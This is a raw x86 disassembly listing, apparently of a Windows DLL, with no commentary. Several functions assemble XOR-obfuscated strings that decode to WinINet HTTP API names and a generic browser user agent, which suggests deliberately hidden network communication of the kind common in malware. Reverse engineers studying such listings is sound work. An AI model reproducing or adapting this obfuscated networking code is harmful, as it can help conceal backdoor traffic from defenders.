10002ab4:	53                   	push   %ebx
10002ab5:	53                   	push   %ebx
10002ab6:	50                   	push   %eax
10002ab7:	ff 15 78 07 01 10    	call   *0x10010778
10002abd:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
10002ac3:	3b c3                	cmp    %ebx,%eax
10002ac5:	0f 85 8a 00 00 00    	jne    0x10002b55
10002acb:	ff 15 60 e1 00 10    	call   *0x1000e160
10002ad1:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
10002ad7:	ff 75 a8             	push   -0x58(%ebp)
10002ada:	ff 15 80 07 01 10    	call   *0x10010780
10002ae0:	89 5d a8             	mov    %ebx,-0x58(%ebp)
10002ae3:	ff 75 ac             	push   -0x54(%ebp)
10002ae6:	ff 15 80 07 01 10    	call   *0x10010780
10002aec:	89 5d ac             	mov    %ebx,-0x54(%ebp)
10002aef:	ff 75 c0             	push   -0x40(%ebp)
10002af2:	ff 15 80 07 01 10    	call   *0x10010780
10002af8:	89 5d c0             	mov    %ebx,-0x40(%ebp)
10002afb:	53                   	push   %ebx
10002afc:	e8 77 4a 00 00       	call   0x10007578
10002b01:	59                   	pop    %ecx
10002b02:	48                   	dec    %eax
10002b03:	48                   	dec    %eax
10002b04:	f7 d8                	neg    %eax
10002b06:	1b c0                	sbb    %eax,%eax
10002b08:	40                   	inc    %eax
10002b09:	89 85 64 ff ff ff    	mov    %eax,-0x9c(%ebp)
10002b0f:	83 f8 01             	cmp    $0x1,%eax
10002b12:	75 34                	jne    0x10002b48
10002b14:	e8 ec 42 00 00       	call   0x10006e05
10002b19:	85 c0                	test   %eax,%eax
10002b1b:	74 2b                	je     0x10002b48
10002b1d:	38 5d 8c             	cmp    %bl,-0x74(%ebp)
10002b20:	75 08                	jne    0x10002b2a
10002b22:	e8 c9 17 00 00       	call   0x100042f0
10002b27:	88 45 8c             	mov    %al,-0x74(%ebp)
10002b2a:	38 9d 78 ff ff ff    	cmp    %bl,-0x88(%ebp)
10002b30:	75 16                	jne    0x10002b48
10002b32:	83 7d 94 01          	cmpl   $0x1,-0x6c(%ebp)
10002b36:	75 10                	jne    0x10002b48
10002b38:	83 7d 18 01          	cmpl   $0x1,0x18(%ebp)
10002b3c:	75 0a                	jne    0x10002b48
10002b3e:	89 5d 94             	mov    %ebx,-0x6c(%ebp)
10002b41:	c6 85 78 ff ff ff 01 	movb   $0x1,-0x88(%ebp)
10002b48:	e8 99 16 00 00       	call   0x100041e6
10002b4d:	50                   	push   %eax
10002b4e:	ff d6                	call   *%esi
10002b50:	e9 b3 fe ff ff       	jmp    0x10002a08
10002b55:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
10002b58:	89 5d 98             	mov    %ebx,-0x68(%ebp)
10002b5b:	8d 45 98             	lea    -0x68(%ebp),%eax
10002b5e:	50                   	push   %eax
10002b5f:	8d 45 b4             	lea    -0x4c(%ebp),%eax
10002b62:	50                   	push   %eax
10002b63:	ff 75 c0             	push   -0x40(%ebp)
10002b66:	e8 ac 08 00 00       	call   0x10003417
10002b6b:	83 c4 0c             	add    $0xc,%esp
10002b6e:	89 45 9c             	mov    %eax,-0x64(%ebp)
10002b71:	3b c3                	cmp    %ebx,%eax
10002b73:	7f 0c                	jg     0x10002b81
10002b75:	c7 45 b0 a3 e4 ff ff 	movl   $0xffffe4a3,-0x50(%ebp)
10002b7c:	e9 cd 00 00 00       	jmp    0x10002c4e
10002b81:	39 5d ac             	cmp    %ebx,-0x54(%ebp)
10002b84:	74 0c                	je     0x10002b92
10002b86:	ff 75 ac             	push   -0x54(%ebp)
10002b89:	ff 15 80 07 01 10    	call   *0x10010780
10002b8f:	89 5d ac             	mov    %ebx,-0x54(%ebp)
10002b92:	39 5d c0             	cmp    %ebx,-0x40(%ebp)
10002b95:	74 0c                	je     0x10002ba3
10002b97:	ff 75 c0             	push   -0x40(%ebp)
10002b9a:	ff 15 80 07 01 10    	call   *0x10010780
10002ba0:	89 5d c0             	mov    %ebx,-0x40(%ebp)
10002ba3:	89 5d a0             	mov    %ebx,-0x60(%ebp)
10002ba6:	89 5d 90             	mov    %ebx,-0x70(%ebp)
10002ba9:	89 5d b8             	mov    %ebx,-0x48(%ebp)
10002bac:	89 9d 7c ff ff ff    	mov    %ebx,-0x84(%ebp)
10002bb2:	8b 45 b4             	mov    -0x4c(%ebp),%eax
10002bb5:	89 45 c4             	mov    %eax,-0x3c(%ebp)
10002bb8:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
10002bbe:	51                   	push   %ecx
10002bbf:	8d 4d b8             	lea    -0x48(%ebp),%ecx
10002bc2:	51                   	push   %ecx
10002bc3:	53                   	push   %ebx
10002bc4:	8d 4d a0             	lea    -0x60(%ebp),%ecx
10002bc7:	51                   	push   %ecx
10002bc8:	ff 75 98             	push   -0x68(%ebp)
10002bcb:	50                   	push   %eax
10002bcc:	e8 cd 09 00 00       	call   0x1000359e
10002bd1:	83 c4 18             	add    $0x18,%esp
10002bd4:	85 c0                	test   %eax,%eax
10002bd6:	75 09                	jne    0x10002be1
10002bd8:	c7 45 b0 a2 e4 ff ff 	movl   $0xffffe4a2,-0x50(%ebp)
10002bdf:	eb 6d                	jmp    0x10002c4e
10002be1:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
10002be4:	89 9d 6c ff ff ff    	mov    %ebx,-0x94(%ebp)
10002bea:	8b 45 a0             	mov    -0x60(%ebp),%eax
10002bed:	89 45 a4             	mov    %eax,-0x5c(%ebp)
10002bf0:	89 5d 88             	mov    %ebx,-0x78(%ebp)
10002bf3:	8d 4d 88             	lea    -0x78(%ebp),%ecx
10002bf6:	51                   	push   %ecx
10002bf7:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
10002bfd:	51                   	push   %ecx
10002bfe:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
10002c01:	51                   	push   %ecx
10002c02:	ff 75 1c             	push   0x1c(%ebp)
10002c05:	ff 75 10             	push   0x10(%ebp)
10002c08:	ff 75 0c             	push   0xc(%ebp)
10002c0b:	53                   	push   %ebx
10002c0c:	50                   	push   %eax
10002c0d:	ff 75 a8             	push   -0x58(%ebp)
10002c10:	e8 58 0b 00 00       	call   0x1000376d
10002c15:	83 c4 24             	add    $0x24,%esp
10002c18:	89 45 b0             	mov    %eax,-0x50(%ebp)
10002c1b:	39 5d 88             	cmp    %ebx,-0x78(%ebp)
10002c1e:	74 2e                	je     0x10002c4e
10002c20:	3b c3                	cmp    %ebx,%eax
10002c22:	7c 2a                	jl     0x10002c4e
10002c24:	8b 45 b8             	mov    -0x48(%ebp),%eax
10002c27:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10002c2a:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
10002c30:	ff 75 84             	push   -0x7c(%ebp)
10002c33:	ff 75 1c             	push   0x1c(%ebp)
10002c36:	ff b5 7c ff ff ff    	push   -0x84(%ebp)
10002c3c:	50                   	push   %eax
10002c3d:	ff 75 a8             	push   -0x58(%ebp)
10002c40:	e8 96 12 00 00       	call   0x10003edb
10002c45:	83 c4 18             	add    $0x18,%esp
10002c48:	89 85 74 ff ff ff    	mov    %eax,-0x8c(%ebp)
10002c4e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10002c51:	e8 07 00 00 00       	call   0x10002c5d
10002c56:	e9 91 00 00 00       	jmp    0x10002cec
10002c5b:	33 db                	xor    %ebx,%ebx
10002c5d:	39 5d bc             	cmp    %ebx,-0x44(%ebp)
10002c60:	74 11                	je     0x10002c73
10002c62:	ff 75 bc             	push   -0x44(%ebp)
10002c65:	8b 35 c8 e1 00 10    	mov    0x1000e1c8,%esi
10002c6b:	ff d6                	call   *%esi
10002c6d:	59                   	pop    %ecx
10002c6e:	89 5d bc             	mov    %ebx,-0x44(%ebp)
10002c71:	eb 06                	jmp    0x10002c79
10002c73:	8b 35 c8 e1 00 10    	mov    0x1000e1c8,%esi
10002c79:	39 5d a4             	cmp    %ebx,-0x5c(%ebp)
10002c7c:	74 09                	je     0x10002c87
10002c7e:	ff 75 a4             	push   -0x5c(%ebp)
10002c81:	ff d6                	call   *%esi
10002c83:	59                   	pop    %ecx
10002c84:	89 5d a4             	mov    %ebx,-0x5c(%ebp)
10002c87:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
10002c8a:	74 09                	je     0x10002c95
10002c8c:	ff 75 e4             	push   -0x1c(%ebp)
10002c8f:	ff d6                	call   *%esi
10002c91:	59                   	pop    %ecx
10002c92:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10002c95:	39 5d c4             	cmp    %ebx,-0x3c(%ebp)
10002c98:	74 09                	je     0x10002ca3
10002c9a:	ff 75 c4             	push   -0x3c(%ebp)
10002c9d:	ff d6                	call   *%esi
10002c9f:	59                   	pop    %ecx
10002ca0:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
10002ca3:	39 5d a8             	cmp    %ebx,-0x58(%ebp)
10002ca6:	74 0c                	je     0x10002cb4
10002ca8:	ff 75 a8             	push   -0x58(%ebp)
10002cab:	ff 15 80 07 01 10    	call   *0x10010780
10002cb1:	89 5d a8             	mov    %ebx,-0x58(%ebp)
10002cb4:	39 5d ac             	cmp    %ebx,-0x54(%ebp)
10002cb7:	74 0c                	je     0x10002cc5
10002cb9:	ff 75 ac             	push   -0x54(%ebp)
10002cbc:	ff 15 80 07 01 10    	call   *0x10010780
10002cc2:	89 5d ac             	mov    %ebx,-0x54(%ebp)
10002cc5:	39 5d c0             	cmp    %ebx,-0x40(%ebp)
10002cc8:	74 0c                	je     0x10002cd6
10002cca:	ff 75 c0             	push   -0x40(%ebp)
10002ccd:	ff 15 80 07 01 10    	call   *0x10010780
10002cd3:	89 5d c0             	mov    %ebx,-0x40(%ebp)
10002cd6:	e8 86 02 00 00       	call   0x10002f61
10002cdb:	c3                   	ret
10002cdc:	eb 0e                	jmp    0x10002cec
10002cde:	6a 01                	push   $0x1
10002ce0:	58                   	pop    %eax
10002ce1:	c3                   	ret
10002ce2:	8b 65 e8             	mov    -0x18(%ebp),%esp
10002ce5:	c7 45 b0 9d e4 ff ff 	movl   $0xffffe49d,-0x50(%ebp)
10002cec:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10002cf0:	8b 45 b0             	mov    -0x50(%ebp),%eax
10002cf3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10002cf6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10002cfd:	5f                   	pop    %edi
10002cfe:	5e                   	pop    %esi
10002cff:	5b                   	pop    %ebx
10002d00:	c9                   	leave
10002d01:	c3                   	ret
10002d02:	55                   	push   %ebp
10002d03:	8b ec                	mov    %esp,%ebp
10002d05:	6a ff                	push   $0xffffffff
10002d07:	68 50 e2 00 10       	push   $0x1000e250
10002d0c:	68 00 c6 00 10       	push   $0x1000c600
10002d11:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10002d17:	50                   	push   %eax
10002d18:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10002d1f:	83 ec 4c             	sub    $0x4c,%esp
10002d22:	53                   	push   %ebx
10002d23:	56                   	push   %esi
10002d24:	57                   	push   %edi
10002d25:	89 65 e8             	mov    %esp,-0x18(%ebp)
10002d28:	33 db                	xor    %ebx,%ebx
10002d2a:	89 5d c0             	mov    %ebx,-0x40(%ebp)
10002d2d:	89 5d bc             	mov    %ebx,-0x44(%ebp)
10002d30:	c6 45 c4 32          	movb   $0x32,-0x3c(%ebp)
10002d34:	c6 45 c5 10          	movb   $0x10,-0x3b(%ebp)
10002d38:	c6 45 c6 05          	movb   $0x5,-0x3a(%ebp)
10002d3c:	c6 45 c7 16          	movb   $0x16,-0x39(%ebp)
10002d40:	c6 45 c8 13          	movb   $0x13,-0x38(%ebp)
10002d44:	c6 45 c9 13          	movb   $0x13,-0x37(%ebp)
10002d48:	c6 45 ca 1e          	movb   $0x1e,-0x36(%ebp)
10002d4c:	c6 45 cb 50          	movb   $0x50,-0x35(%ebp)
10002d50:	c6 45 cc 4b          	movb   $0x4b,-0x34(%ebp)
10002d54:	c6 45 cd 51          	movb   $0x51,-0x33(%ebp)
10002d58:	c6 45 ce 4f          	movb   $0x4f,-0x32(%ebp)
10002d5c:	c6 45 cf 5f          	movb   $0x5f,-0x31(%ebp)
10002d60:	c6 45 d0 57          	movb   $0x57,-0x30(%ebp)
10002d64:	c6 45 d1 1c          	movb   $0x1c,-0x2f(%ebp)
10002d68:	c6 45 d2 10          	movb   $0x10,-0x2e(%ebp)
10002d6c:	c6 45 d3 12          	movb   $0x12,-0x2d(%ebp)
10002d70:	c6 45 d4 0f          	movb   $0xf,-0x2c(%ebp)
10002d74:	c6 45 d5 1e          	movb   $0x1e,-0x2b(%ebp)
10002d78:	c6 45 d6 0b          	movb   $0xb,-0x2a(%ebp)
10002d7c:	c6 45 d7 16          	movb   $0x16,-0x29(%ebp)
10002d80:	c6 45 d8 1d          	movb   $0x1d,-0x28(%ebp)
10002d84:	c6 45 d9 13          	movb   $0x13,-0x27(%ebp)
10002d88:	c6 45 da 1a          	movb   $0x1a,-0x26(%ebp)
10002d8c:	c6 45 db 44          	movb   $0x44,-0x25(%ebp)
10002d90:	c6 45 dc 56          	movb   $0x56,-0x24(%ebp)
10002d94:	88 5d dd             	mov    %bl,-0x23(%ebp)
10002d97:	c6 45 e0 40          	movb   $0x40,-0x20(%ebp)
10002d9b:	c6 45 e1 5a          	movb   $0x5a,-0x1f(%ebp)
10002d9f:	c6 45 e2 5a          	movb   $0x5a,-0x1e(%ebp)
10002da3:	88 5d e3             	mov    %bl,-0x1d(%ebp)
10002da6:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10002da9:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
10002db0:	8d 45 c4             	lea    -0x3c(%ebp),%eax
10002db3:	50                   	push   %eax
10002db4:	e8 35 48 00 00       	call   0x100075ee
10002db9:	8d 45 e0             	lea    -0x20(%ebp),%eax
10002dbc:	50                   	push   %eax
10002dbd:	e8 2c 48 00 00       	call   0x100075ee
10002dc2:	59                   	pop    %ecx
10002dc3:	59                   	pop    %ecx
10002dc4:	e8 b0 01 00 00       	call   0x10002f79
10002dc9:	85 c0                	test   %eax,%eax
10002dcb:	75 0c                	jne    0x10002dd9
10002dcd:	c7 45 c0 a6 e4 ff ff 	movl   $0xffffe4a6,-0x40(%ebp)
10002dd4:	e9 3f 01 00 00       	jmp    0x10002f18
10002dd9:	8d 45 e0             	lea    -0x20(%ebp),%eax
10002ddc:	50                   	push   %eax
10002ddd:	e8 7e a5 00 00       	call   0x1000d360
10002de2:	89 45 a4             	mov    %eax,-0x5c(%ebp)
10002de5:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10002de8:	8d 34 08             	lea    (%eax,%ecx,1),%esi
10002deb:	89 75 b8             	mov    %esi,-0x48(%ebp)
10002dee:	8d 46 01             	lea    0x1(%esi),%eax
10002df1:	50                   	push   %eax
10002df2:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10002df8:	59                   	pop    %ecx
10002df9:	59                   	pop    %ecx
10002dfa:	8b f8                	mov    %eax,%edi
10002dfc:	89 7d e4             	mov    %edi,-0x1c(%ebp)
10002dff:	3b fb                	cmp    %ebx,%edi
10002e01:	75 0c                	jne    0x10002e0f
10002e03:	c7 45 c0 a1 e4 ff ff 	movl   $0xffffe4a1,-0x40(%ebp)
10002e0a:	e9 09 01 00 00       	jmp    0x10002f18
10002e0f:	8d 46 01             	lea    0x1(%esi),%eax
10002e12:	50                   	push   %eax
10002e13:	53                   	push   %ebx
10002e14:	57                   	push   %edi
10002e15:	e8 fc a4 00 00       	call   0x1000d316
10002e1a:	56                   	push   %esi
10002e1b:	ff 75 08             	push   0x8(%ebp)
10002e1e:	57                   	push   %edi
10002e1f:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10002e25:	57                   	push   %edi
10002e26:	e8 35 a5 00 00       	call   0x1000d360
10002e2b:	2b f0                	sub    %eax,%esi
10002e2d:	56                   	push   %esi
10002e2e:	8d 45 e0             	lea    -0x20(%ebp),%eax
10002e31:	50                   	push   %eax
10002e32:	57                   	push   %edi
10002e33:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10002e39:	83 c4 28             	add    $0x28,%esp
10002e3c:	53                   	push   %ebx
10002e3d:	53                   	push   %ebx
10002e3e:	53                   	push   %ebx
10002e3f:	53                   	push   %ebx
10002e40:	8d 45 c4             	lea    -0x3c(%ebp),%eax
10002e43:	50                   	push   %eax
10002e44:	ff 15 88 07 01 10    	call   *0x10010788
10002e4a:	89 45 bc             	mov    %eax,-0x44(%ebp)
10002e4d:	3b c3                	cmp    %ebx,%eax
10002e4f:	75 0c                	jne    0x10002e5d
10002e51:	c7 45 c0 a4 e4 ff ff 	movl   $0xffffe4a4,-0x40(%ebp)
10002e58:	e9 bb 00 00 00       	jmp    0x10002f18
10002e5d:	89 5d b0             	mov    %ebx,-0x50(%ebp)
10002e60:	89 5d a8             	mov    %ebx,-0x58(%ebp)
10002e63:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
10002e66:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
10002e69:	51                   	push   %ecx
10002e6a:	8d 4d a8             	lea    -0x58(%ebp),%ecx
10002e6d:	51                   	push   %ecx
10002e6e:	8d 4d b0             	lea    -0x50(%ebp),%ecx
10002e71:	51                   	push   %ecx
10002e72:	ff 75 18             	push   0x18(%ebp)
10002e75:	ff 75 14             	push   0x14(%ebp)
10002e78:	ff 75 10             	push   0x10(%ebp)
10002e7b:	8b 75 0c             	mov    0xc(%ebp),%esi
10002e7e:	56                   	push   %esi
10002e7f:	57                   	push   %edi
10002e80:	50                   	push   %eax
10002e81:	e8 e7 08 00 00       	call   0x1000376d
10002e86:	83 c4 24             	add    $0x24,%esp
10002e89:	89 45 c0             	mov    %eax,-0x40(%ebp)
10002e8c:	3b c3                	cmp    %ebx,%eax
10002e8e:	0f 8d 84 00 00 00    	jge    0x10002f18
10002e94:	53                   	push   %ebx
10002e95:	e8 de 46 00 00       	call   0x10007578
10002e9a:	59                   	pop    %ecx
10002e9b:	48                   	dec    %eax
10002e9c:	48                   	dec    %eax
10002e9d:	f7 d8                	neg    %eax
10002e9f:	1b c0                	sbb    %eax,%eax
10002ea1:	40                   	inc    %eax
10002ea2:	89 45 ac             	mov    %eax,-0x54(%ebp)
10002ea5:	83 f8 01             	cmp    $0x1,%eax
10002ea8:	75 6e                	jne    0x10002f18
10002eaa:	e8 56 3f 00 00       	call   0x10006e05
10002eaf:	85 c0                	test   %eax,%eax
10002eb1:	74 65                	je     0x10002f18
10002eb3:	ff 75 bc             	push   -0x44(%ebp)
10002eb6:	ff 15 80 07 01 10    	call   *0x10010780
10002ebc:	89 5d bc             	mov    %ebx,-0x44(%ebp)
10002ebf:	e8 2c 14 00 00       	call   0x100042f0
10002ec4:	3c 01                	cmp    $0x1,%al
10002ec6:	75 50                	jne    0x10002f18
10002ec8:	53                   	push   %ebx
10002ec9:	53                   	push   %ebx
10002eca:	53                   	push   %ebx
10002ecb:	53                   	push   %ebx
10002ecc:	8d 45 c4             	lea    -0x3c(%ebp),%eax
10002ecf:	50                   	push   %eax
10002ed0:	ff 15 88 07 01 10    	call   *0x10010788
10002ed6:	89 45 bc             	mov    %eax,-0x44(%ebp)
10002ed9:	3b c3                	cmp    %ebx,%eax
10002edb:	74 3b                	je     0x10002f18
10002edd:	8d 46 01             	lea    0x1(%esi),%eax
10002ee0:	50                   	push   %eax
10002ee1:	53                   	push   %ebx
10002ee2:	57                   	push   %edi
10002ee3:	e8 2e a4 00 00       	call   0x1000d316
10002ee8:	56                   	push   %esi
10002ee9:	ff 75 08             	push   0x8(%ebp)
10002eec:	57                   	push   %edi
10002eed:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10002ef3:	8d 45 b4             	lea    -0x4c(%ebp),%eax
10002ef6:	50                   	push   %eax
10002ef7:	8d 45 a8             	lea    -0x58(%ebp),%eax
10002efa:	50                   	push   %eax
10002efb:	8d 45 b0             	lea    -0x50(%ebp),%eax
10002efe:	50                   	push   %eax
10002eff:	ff 75 18             	push   0x18(%ebp)
10002f02:	ff 75 14             	push   0x14(%ebp)
10002f05:	ff 75 10             	push   0x10(%ebp)
10002f08:	56                   	push   %esi
10002f09:	57                   	push   %edi
10002f0a:	ff 75 bc             	push   -0x44(%ebp)
10002f0d:	e8 5b 08 00 00       	call   0x1000376d
10002f12:	83 c4 3c             	add    $0x3c,%esp
10002f15:	89 45 c0             	mov    %eax,-0x40(%ebp)
10002f18:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10002f1b:	e8 04 00 00 00       	call   0x10002f24
10002f20:	eb 29                	jmp    0x10002f4b
10002f22:	33 db                	xor    %ebx,%ebx
10002f24:	39 5d bc             	cmp    %ebx,-0x44(%ebp)
10002f27:	74 0c                	je     0x10002f35
10002f29:	ff 75 bc             	push   -0x44(%ebp)
10002f2c:	ff 15 80 07 01 10    	call   *0x10010780
10002f32:	89 5d bc             	mov    %ebx,-0x44(%ebp)
10002f35:	e8 27 00 00 00       	call   0x10002f61
10002f3a:	c3                   	ret
10002f3b:	eb 0e                	jmp    0x10002f4b
10002f3d:	6a 01                	push   $0x1
10002f3f:	58                   	pop    %eax
10002f40:	c3                   	ret
10002f41:	8b 65 e8             	mov    -0x18(%ebp),%esp
10002f44:	c7 45 c0 95 e4 ff ff 	movl   $0xffffe495,-0x40(%ebp)
10002f4b:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10002f4f:	8b 45 c0             	mov    -0x40(%ebp),%eax
10002f52:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10002f55:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10002f5c:	5f                   	pop    %edi
10002f5d:	5e                   	pop    %esi
10002f5e:	5b                   	pop    %ebx
10002f5f:	c9                   	leave
10002f60:	c3                   	ret
10002f61:	a1 90 07 01 10       	mov    0x10010790,%eax
10002f66:	85 c0                	test   %eax,%eax
10002f68:	74 0e                	je     0x10002f78
10002f6a:	50                   	push   %eax
10002f6b:	ff 15 98 e0 00 10    	call   *0x1000e098
10002f71:	83 25 90 07 01 10 00 	andl   $0x0,0x10010790
10002f78:	c3                   	ret
10002f79:	55                   	push   %ebp
10002f7a:	8b ec                	mov    %esp,%ebp
10002f7c:	6a ff                	push   $0xffffffff
10002f7e:	68 68 e2 00 10       	push   $0x1000e268
10002f83:	68 00 c6 00 10       	push   $0x1000c600
10002f88:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10002f8e:	50                   	push   %eax
10002f8f:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10002f96:	81 ec b0 00 00 00    	sub    $0xb0,%esp
10002f9c:	53                   	push   %ebx
10002f9d:	56                   	push   %esi
10002f9e:	57                   	push   %edi
10002f9f:	89 65 e8             	mov    %esp,-0x18(%ebp)
10002fa2:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
10002fa9:	c6 85 7c ff ff ff 08 	movb   $0x8,-0x84(%ebp)
10002fb0:	c6 85 7d ff ff ff 16 	movb   $0x16,-0x83(%ebp)
10002fb7:	c6 85 7e ff ff ff 11 	movb   $0x11,-0x82(%ebp)
10002fbe:	c6 85 7f ff ff ff 16 	movb   $0x16,-0x81(%ebp)
10002fc5:	c6 45 80 11          	movb   $0x11,-0x80(%ebp)
10002fc9:	c6 45 81 1a          	movb   $0x1a,-0x7f(%ebp)
10002fcd:	c6 45 82 0b          	movb   $0xb,-0x7e(%ebp)
10002fd1:	c6 45 83 51          	movb   $0x51,-0x7d(%ebp)
10002fd5:	c6 45 84 1b          	movb   $0x1b,-0x7c(%ebp)
10002fd9:	c6 45 85 13          	movb   $0x13,-0x7b(%ebp)
10002fdd:	c6 45 86 13          	movb   $0x13,-0x7a(%ebp)
10002fe1:	33 db                	xor    %ebx,%ebx
10002fe3:	88 5d 87             	mov    %bl,-0x79(%ebp)
10002fe6:	c6 85 40 ff ff ff 36 	movb   $0x36,-0xc0(%ebp)
10002fed:	c6 85 41 ff ff ff 11 	movb   $0x11,-0xbf(%ebp)
10002ff4:	c6 85 42 ff ff ff 0b 	movb   $0xb,-0xbe(%ebp)
10002ffb:	c6 85 43 ff ff ff 1a 	movb   $0x1a,-0xbd(%ebp)
10003002:	c6 85 44 ff ff ff 0d 	movb   $0xd,-0xbc(%ebp)
10003009:	c6 85 45 ff ff ff 11 	movb   $0x11,-0xbb(%ebp)
10003010:	c6 85 46 ff ff ff 1a 	movb   $0x1a,-0xba(%ebp)
10003017:	c6 85 47 ff ff ff 0b 	movb   $0xb,-0xb9(%ebp)
1000301e:	c6 85 48 ff ff ff 3c 	movb   $0x3c,-0xb8(%ebp)
10003025:	c6 85 49 ff ff ff 10 	movb   $0x10,-0xb7(%ebp)
1000302c:	c6 85 4a ff ff ff 11 	movb   $0x11,-0xb6(%ebp)
10003033:	c6 85 4b ff ff ff 11 	movb   $0x11,-0xb5(%ebp)
1000303a:	c6 85 4c ff ff ff 1a 	movb   $0x1a,-0xb4(%ebp)
10003041:	c6 85 4d ff ff ff 1c 	movb   $0x1c,-0xb3(%ebp)
10003048:	c6 85 4e ff ff ff 0b 	movb   $0xb,-0xb2(%ebp)
1000304f:	c6 85 4f ff ff ff 3e 	movb   $0x3e,-0xb1(%ebp)
10003056:	88 9d 50 ff ff ff    	mov    %bl,-0xb0(%ebp)
1000305c:	c6 45 c4 36          	movb   $0x36,-0x3c(%ebp)
10003060:	c6 45 c5 11          	movb   $0x11,-0x3b(%ebp)
10003064:	c6 45 c6 0b          	movb   $0xb,-0x3a(%ebp)
10003068:	c6 45 c7 1a          	movb   $0x1a,-0x39(%ebp)
1000306c:	c6 45 c8 0d          	movb   $0xd,-0x38(%ebp)
10003070:	c6 45 c9 11          	movb   $0x11,-0x37(%ebp)
10003074:	c6 45 ca 1a          	movb   $0x1a,-0x36(%ebp)
10003078:	c6 45 cb 0b          	movb   $0xb,-0x35(%ebp)
1000307c:	c6 45 cc 30          	movb   $0x30,-0x34(%ebp)
10003080:	c6 45 cd 0f          	movb   $0xf,-0x33(%ebp)
10003084:	c6 45 ce 1a          	movb   $0x1a,-0x32(%ebp)
10003088:	c6 45 cf 11          	movb   $0x11,-0x31(%ebp)
1000308c:	c6 45 d0 3e          	movb   $0x3e,-0x30(%ebp)
10003090:	88 5d d1             	mov    %bl,-0x2f(%ebp)
10003093:	c6 85 54 ff ff ff 37 	movb   $0x37,-0xac(%ebp)
1000309a:	c6 85 55 ff ff ff 0b 	movb   $0xb,-0xab(%ebp)
100030a1:	c6 85 56 ff ff ff 0b 	movb   $0xb,-0xaa(%ebp)
100030a8:	c6 85 57 ff ff ff 0f 	movb   $0xf,-0xa9(%ebp)
100030af:	c6 85 58 ff ff ff 30 	movb   $0x30,-0xa8(%ebp)
100030b6:	c6 85 59 ff ff ff 0f 	movb   $0xf,-0xa7(%ebp)
100030bd:	c6 85 5a ff ff ff 1a 	movb   $0x1a,-0xa6(%ebp)
100030c4:	c6 85 5b ff ff ff 11 	movb   $0x11,-0xa5(%ebp)
100030cb:	c6 85 5c ff ff ff 2d 	movb   $0x2d,-0xa4(%ebp)
100030d2:	c6 85 5d ff ff ff 1a 	movb   $0x1a,-0xa3(%ebp)
100030d9:	c6 85 5e ff ff ff 0e 	movb   $0xe,-0xa2(%ebp)
100030e0:	c6 85 5f ff ff ff 0a 	movb   $0xa,-0xa1(%ebp)
100030e7:	c6 85 60 ff ff ff 1a 	movb   $0x1a,-0xa0(%ebp)
100030ee:	c6 85 61 ff ff ff 0c 	movb   $0xc,-0x9f(%ebp)
100030f5:	c6 85 62 ff ff ff 0b 	movb   $0xb,-0x9e(%ebp)
100030fc:	c6 85 63 ff ff ff 3e 	movb   $0x3e,-0x9d(%ebp)
10003103:	88 9d 64 ff ff ff    	mov    %bl,-0x9c(%ebp)
10003109:	c6 45 9c 37          	movb   $0x37,-0x64(%ebp)
1000310d:	c6 45 9d 0b          	movb   $0xb,-0x63(%ebp)
10003111:	c6 45 9e 0b          	movb   $0xb,-0x62(%ebp)
10003115:	c6 45 9f 0f          	movb   $0xf,-0x61(%ebp)
10003119:	c6 45 a0 2c          	movb   $0x2c,-0x60(%ebp)
1000311d:	c6 45 a1 1a          	movb   $0x1a,-0x5f(%ebp)
10003121:	c6 45 a2 11          	movb   $0x11,-0x5e(%ebp)
10003125:	c6 45 a3 1b          	movb   $0x1b,-0x5d(%ebp)
10003129:	c6 45 a4 2d          	movb   $0x2d,-0x5c(%ebp)
1000312d:	c6 45 a5 1a          	movb   $0x1a,-0x5b(%ebp)
10003131:	c6 45 a6 0e          	movb   $0xe,-0x5a(%ebp)
10003135:	c6 45 a7 0a          	movb   $0xa,-0x59(%ebp)
10003139:	c6 45 a8 1a          	movb   $0x1a,-0x58(%ebp)
1000313d:	c6 45 a9 0c          	movb   $0xc,-0x57(%ebp)
10003141:	c6 45 aa 0b          	movb   $0xb,-0x56(%ebp)
10003145:	c6 45 ab 3e          	movb   $0x3e,-0x55(%ebp)
10003149:	88 5d ac             	mov    %bl,-0x54(%ebp)
1000314c:	c6 45 d4 37          	movb   $0x37,-0x2c(%ebp)
10003150:	c6 45 d5 0b          	movb   $0xb,-0x2b(%ebp)
10003154:	c6 45 d6 0b          	movb   $0xb,-0x2a(%ebp)
10003158:	c6 45 d7 0f          	movb   $0xf,-0x29(%ebp)
1000315c:	c6 45 d8 2e          	movb   $0x2e,-0x28(%ebp)
10003160:	c6 45 d9 0a          	movb   $0xa,-0x27(%ebp)
10003164:	c6 45 da 1a          	movb   $0x1a,-0x26(%ebp)
